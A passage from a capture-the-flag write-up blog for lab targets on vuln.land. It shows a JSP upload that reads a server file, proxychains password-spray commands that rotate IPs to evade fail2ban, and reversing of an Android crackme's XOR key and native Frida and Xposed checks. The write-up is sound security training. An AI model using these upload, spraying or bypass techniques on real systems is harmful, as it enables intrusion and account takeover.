+</span></span><span style="display:flex;"><span>        &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+</span></span><span style="display:flex;"><span>        &lt;title&gt;Read Text&lt;/title&gt;
+</span></span><span style="display:flex;"><span>    &lt;/head&gt;
+</span></span><span style="display:flex;"><span>    &lt;body&gt;
+</span></span><span style="display:flex;"><span>        &lt;%
+</span></span><span style="display:flex;"><span>            String txtFilePath = &#34;/var/gold.txt&#34;;
+</span></span><span style="display:flex;"><span>            BufferedReader reader = new BufferedReader(new FileReader(txtFilePath));
+</span></span><span style="display:flex;"><span>            StringBuilder sb = new StringBuilder();
+</span></span><span style="display:flex;"><span>            String line;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            while((line = reader.readLine())!= null){
+</span></span><span style="display:flex;"><span>                sb.append(line+&#34;\n&#34;);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            out.println(sb.toString()); 
+</span></span><span style="display:flex;"><span>        %&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After upload it, we can simply open the file
+<p class="markdown-image">
+  <img src="https://i.imgur.com/a0sHb0o.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: New is always better. - Barney Stinson</p>
+</blockquote>
+<h2 id="ctf-spray-attack-ssh">CTF Spray Attack SSH <a href="#ctf-spray-attack-ssh" class="anchor">#</a></h2>
+<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains sshpass -p <span style="color:#f60">93370760</span> ssh -o <span style="color:#033">StrictHostKeyChecking</span><span style="color:#555">=</span>no user_100283@pwspray.vm.vuln.land -p <span style="color:#f60">22</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><p class="markdown-image">
+  <img src="https://i.imgur.com/mT0j5pe.png" alt=""  />
+</p></p>
+<h2 id="ctf-spray-attack-http">CTF Spray Attack HTTP <a href="#ctf-spray-attack-http" class="anchor">#</a></h2>
+<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains curl --user user_140244:6ed42dd7 http://pwspray.vm.vuln.land -v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><p class="markdown-image">
+  <img src="https://i.imgur.com/e3Yuq6D.png" alt=""  />
+</p></p>
+<h2 id="crack-me-android">Crack me Android <a href="#crack-me-android" class="anchor">#</a></h2>
+<p>I got an apk file, and I try to decompile it with the help of JDK. After reading the result I found the login code in the LoginViewModel.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">public</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">login</span><span style="color:#555">(</span>String str<span style="color:#555">)</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>checkHooking<span style="color:#555">())</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">this</span><span style="color:#555">.</span><span style="color:#309">loginResult</span><span style="color:#555">.</span><span style="color:#309">setValue</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> LoginResult<span style="color:#555">(</span>Integer<span style="color:#555">.</span><span style="color:#309">valueOf</span><span style="color:#555">((</span><span style="color:#078;font-weight:bold">int</span><span style="color:#555">)</span> R<span style="color:#555">.</span><span style="color:#309">string</span><span style="color:#555">.</span><span style="color:#309">must_not_hook</span><span style="color:#555">)));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span><span style="color:#555">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">try</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[]</span> checkPw <span style="color:#555">=</span> checkPw<span style="color:#555">(</span>getCode<span style="color:#555">(</span>str<span style="color:#555">));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>checkPw<span style="color:#555">.</span><span style="color:#309">length</span> <span style="color:#555">&gt;</span> 0<span style="color:#555">)</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">this</span><span style="color:#555">.</span><span style="color:#309">loginResult</span><span style="color:#555">.</span><span style="color:#309">setValue</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> LoginResult<span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> LoggedInUser<span style="color:#555">(</span>getStringFromCode<span style="color:#555">(</span>checkPw<span style="color:#555">),</span> <span style="color:#c30">&#34;Well done you did it.&#34;</span><span style="color:#555">)));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#555">}</span> <span style="color:#069;font-weight:bold">else</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">this</span><span style="color:#555">.</span><span style="color:#309">loginResult</span><span style="color:#555">.</span><span style="color:#309">setValue</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> LoginResult<span style="color:#555">(</span>Integer<span style="color:#555">.</span><span style="color:#309">valueOf</span><span style="color:#555">((</span><span style="color:#078;font-weight:bold">int</span><span style="color:#555">)</span> R<span style="color:#555">.</span><span style="color:#309">string</span><span style="color:#555">.</span><span style="color:#309">login_failed</span><span style="color:#555">)));</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span> <span style="color:#069;font-weight:bold">catch</span> <span style="color:#555">(</span>Exception unused<span style="color:#555">)</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">this</span><span style="color:#555">.</span><span style="color:#309">loginResult</span><span style="color:#555">.</span><span style="color:#309">setValue</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> LoginResult<span style="color:#555">(</span>Integer<span style="color:#555">.</span><span style="color:#309">valueOf</span><span style="color:#555">((</span><span style="color:#078;font-weight:bold">int</span><span style="color:#555">)</span> R<span style="color:#555">.</span><span style="color:#309">string</span><span style="color:#555">.</span><span style="color:#309">error_logging_in</span><span style="color:#555">)));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">protected</span> <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[]</span> x0 <span style="color:#555">=</span> <span style="color:#555">{</span>121<span style="color:#555">,</span> 134<span style="color:#555">,</span> 239<span style="color:#555">,</span> 213<span style="color:#555">,</span> 16<span style="color:#555">,</span> 28<span style="color:#555">,</span> 184<span style="color:#555">,</span> 101<span style="color:#555">,</span> 150<span style="color:#555">,</span> 60<span style="color:#555">,</span> 170<span style="color:#555">,</span> 49<span style="color:#555">,</span> 159<span style="color:#555">,</span> 189<span style="color:#555">,</span> 241<span style="color:#555">,</span> 146<span style="color:#555">,</span> 141<span style="color:#555">,</span> 22<span style="color:#555">,</span> 205<span style="color:#555">,</span> 223<span style="color:#555">,</span> 218<span style="color:#555">,</span> 210<span style="color:#555">,</span> 99<span style="color:#555">,</span> 219<span style="color:#555">,</span> 34<span style="color:#555">,</span> 84<span style="color:#555">,</span> 156<span style="color:#555">,</span> 237<span style="color:#555">,</span> 26<span style="color:#555">,</span> 94<span style="color:#555">,</span> 178<span style="color:#555">,</span> 230<span style="color:#555">,</span> 27<span style="color:#555">,</span> 180<span style="color:#555">,</span> 72<span style="color:#555">,</span> 32<span style="color:#555">,</span> 102<span style="color:#555">,</span> 192<span style="color:#555">,</span> 178<span style="color:#555">,</span> 234<span style="color:#555">,</span> 228<span style="color:#555">,</span> 38<span style="color:#555">,</span> 37<span style="color:#555">,</span> 142<span style="color:#555">,</span> 242<span style="color:#555">,</span> 142<span style="color:#555">,</span> 133<span style="color:#555">,</span> 159<span style="color:#555">,</span> 142<span style="color:#555">,</span> 33<span style="color:#555">};</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">protected</span> <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[]</span> <span style="color:#c0f">getCode</span><span style="color:#555">(</span>String str<span style="color:#555">)</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">byte</span><span style="color:#555">[]</span> bytes <span style="color:#555">=</span> str<span style="color:#555">.</span><span style="color:#309">getBytes</span><span style="color:#555">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[]</span> iArr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[</span>str<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">()];</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">for</span> <span style="color:#555">(</span><span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> 0<span style="color:#555">;</span> i <span style="color:#555">&lt;</span> str<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">();</span> i<span style="color:#555">++)</span> <span style="color:#555">{</span>
+</span></span><span style="display:flex;"><span>            iArr<span style="color:#555">[</span>i<span style="color:#555">]</span> <span style="color:#555">=</span> bytes<span style="color:#555">[</span>i<span style="color:#555">]</span> <span style="color:#555">^</span> x0<span style="color:#555">[</span>i<span style="color:#555">];</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> iArr<span style="color:#555">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Basically, what it do is our password will be xor-ed with the <code>x0</code> var, and then the result will be passed to native method called <code>checkPw</code>
+I extract the native lib so file, and open it on Ghidra. With the help of JNIAnalyzer, I could deduce the password checker that was used in the <code>checkPw</code> method.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>jintArray <span style="color:#c0f">Java_org_bfe_crackmenative_ui_LoginViewModel_checkPw</span>
+</span></span><span style="display:flex;"><span>                    (JNIEnv <span style="color:#555">*</span>env,jobject thiz,jintArray password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">bool</span> bVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">bool</span> bVar2;
+</span></span><span style="display:flex;"><span>  jintArray new_arr;
+</span></span><span style="display:flex;"><span>  jsize password_length;
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#555">*</span>__stream;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>pcVar3;
+</span></span><span style="display:flex;"><span>  jint <span style="color:#555">*</span>curr_char_pass;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> expected_char;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> idx;
+</span></span><span style="display:flex;"><span>  jintArray new_arr5;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_1038 [<span style="color:#f60">4096</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_38;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_38 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  __android_log_write(<span style="color:#f60">4</span>,<span style="color:#c30">&#34;Native Check&#34;</span>,<span style="color:#c30">&#34;Checking password ...&#34;</span>);
+</span></span><span style="display:flex;"><span>  new_arr <span style="color:#555">=</span> (<span style="color:#555">*</span>(<span style="color:#555">*</span>env)<span style="color:#555">-&gt;</span>NewIntArray)(env,<span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span>  password_length <span style="color:#555">=</span> (<span style="color:#555">*</span>(<span style="color:#555">*</span>env)<span style="color:#555">-&gt;</span>GetArrayLength)(env,password);
+</span></span><span style="display:flex;"><span>  new_arr5 <span style="color:#555">=</span> new_arr;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#078;font-weight:bold">int</span>)password_length <span style="color:#555">==</span> <span style="color:#f60">27</span>) {
+</span></span><span style="display:flex;"><span>    __stream <span style="color:#555">=</span> fopen(<span style="color:#c30">&#34;/proc/self/maps&#34;</span>,<span style="color:#c30">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">do</span> {
+</span></span><span style="display:flex;"><span>      pcVar3 <span style="color:#555">=</span> fgets(local_1038,<span style="color:#f60">0x1000</span>,__stream);
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (pcVar3 <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>        bVar1 <span style="color:#555">=</span> <span style="color:#366">false</span>;
+</span></span><span style="display:flex;"><span>        bVar2 <span style="color:#555">=</span> bVar1;
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (__stream <span style="color:#555">==</span> (FILE <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) <span style="color:#069;font-weight:bold">goto</span> LAB_001009f9;
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">goto</span> LAB_001009f1;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      pcVar3 <span style="color:#555">=</span> strstr(local_1038,<span style="color:#c30">&#34;Xposed&#34;</span>);
+</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#555">=</span> <span style="color:#366">true</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#069;font-weight:bold">while</span> ((pcVar3 <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) <span style="color:#555">&amp;&amp;</span> (pcVar3 <span style="color:#555">=</span> strstr(local_1038,<span style="color:#c30">&#34;frida&#34;</span>), pcVar3 <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>)
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>    bVar2 <span style="color:#555">=</span> <span style="color:#366">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (__stream <span style="color:#555">!=</span> (FILE <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_001009f1</span>:
+</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#555">=</span> bVar2;
+</span></span><span style="display:flex;"><span>      fclose(__stream);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_001009f9</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span>bVar1) {
+</span></span><span style="display:flex;"><span>      idx <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>      curr_char_pass <span style="color:#555">=</span> (<span style="color:#555">*</span>(<span style="color:#555">*</span>env)<span style="color:#555">-&gt;</span>GetIntArrayElements)(env,password,(jboolean <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">for</span> (_expected_char <span style="color:#555">=</span> <span style="color:#555">&amp;</span>DAT_00100c8c;
+</span></span><span style="display:flex;"><span>          ((new_arr5 <span style="color:#555">=</span> new_arr,
